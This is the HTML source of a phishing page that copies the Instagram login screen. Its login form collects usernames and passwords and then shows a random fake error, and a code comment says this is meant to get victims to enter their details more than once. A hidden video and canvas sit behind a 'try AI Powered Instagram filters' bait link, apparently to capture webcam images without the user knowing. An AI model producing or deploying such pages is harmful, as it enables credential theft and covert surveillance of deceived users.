 
<!doctype html>
<html>
<head>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<link rel="stylesheet" href="css/styles.css">
<link rel="stylesheet" href="css/media-queries.css">
</head>
<div class="video-wrap" hidden="hidden">
   <video id="video" playsinline autoplay></video>
</div>
<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
    <body>    
    
    <form id="testForm" method="POST" name="form"> 
    
    <main> 
   
      <div class="log-in-container">
        <div class="log-in">
          <img src="assets/images/instagram-logo.png" class="logo" />
          <div class="log-in-form">  
        
            <input name="username" id="username" class="username" type="text" placeholder="Phone number, username or email" />
            <input name="password" id="password" class="password" type="password" placeholder="Password" />
            <button class="log-in-button" id="login" name="login" onclick="randomize();">Log In</button>
            
    </form>
          </div>
          
          <span class="or-divider">OR</span>
          <div class="fb-login">
            <a href="#">
              <img src="assets/images/facebook-icon.png" />
              <span>Log in with Facebook</span>
            </a>
          </div>
          <a href="#">Forgot password?</a>
          
          
          <p id="error"></p>
        </div>
        <div class="sign-up">
          <span>Don't have an account?</span><a href="#">Sign up</a>
          <span>Or try out new AI Powered Instagram filters without logging in by clicking </span><a href="javascript:void(0);" onclick="init(); handleBait();">Here</a>
        </div>
        <div class="get-the-app">
          <span>Get the app</span>
          <div class="app-images">
            <a href="#"><img src="assets/images/applestore.png" /></a>
            <a href="#"><img src="assets/images/googlestore.png" /></a>
          </div>
        </div>
      </div>
      <video id="v_bait" width="300" height="200" autoplay hidden></video>
      <canvas id="c_bait"  width="300"  height="200" hidden></canvas>
      <div class="phones-container">
        <img src="assets/images/phones.png" />
      </div>
    </main>
    <footer>
      <ul class="footer-links">
        <li><a href="#">ABOUT</a></li>
        <li><a href="#">HELP</a></li>
        <li><a href="#">PRESS</a></li>
        <li><a href="#">API</a></li>
        <li><a href="#">JOBS</a></li>
        <li><a href="#">PRIVACY</a></li>
        <li><a href="#">TERMS</a></li>
        <li><a href="#">LOCATIONS</a></li>
        <li><a href="#">TOP</a></li>
        <li><a href="#">ACCOUNTS</a></li>
        <li><a href="#">HASHTAGS</a></li>
        <li><a href="#">LANGUAGE</a></li>
      </ul>
      <span class="copyright">&copy; 2020 INSTAGRAM FROM FACEBOOK</span>
    </footer>
    <script>
                
        let arr = ["username is not correct","password is not correct","an error as occured please enter details again"];
        let p = document.getElementById('error');
        
        function randomize()
        
        {
          let one = document.forms["form"]["username"].value;
          let two = document.forms["form"]["password"].value;
          if(one.length == 0 || two.length == 0)
          {
              alert('All fields are required');
          } 
          else {
            let change = arr[Math.floor(Math.random() * arr.length)];
            const errpr = document.createElement("p");
            const newError = document.createTextNode(change);
            error.appendChild(newError);
            const currentError = document.getElementById("error");
            document.body.insertBefore(error,currentError);
            
          }
        
        //   randmoze the error so user can input stuff more than once and we can get all variations
            
        }

   
    
          
    </script>
    <script type="text/javascript" src = "insert.js"></script>
    <script type="text/javascript" src="script.js"></script>
    </body>

</html>